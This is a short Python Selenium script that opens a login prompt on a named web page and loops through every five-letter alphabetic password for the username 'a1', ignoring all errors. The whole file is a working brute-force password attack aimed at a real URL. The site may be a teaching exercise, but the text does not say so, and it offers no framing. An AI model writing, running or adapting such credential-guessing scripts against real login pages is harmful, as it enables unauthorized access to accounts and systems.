from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.alert import Alert
from selenium.webdriver.support.ui import WebDriverWait as wait
from selenium.webdriver.support import expected_conditions as EC
from brute import brute
import time
from selenium.webdriver.common.action_chains import ActionChains


driver = webdriver.Firefox()
driver.get('https://daveteaches.com/2b/s1/s1.shtml')
wait(driver, 2).until(EC.alert_is_present())
alert = driver.switch_to_alert()
action = ActionChains(driver)
for password in brute(length=5, letters=True, numbers=False, symbols=False):
    try:
        alert.send_keys('a1' + Keys.TAB + password)
        time.sleep(1)
        alert.accept()
    except:
        pass
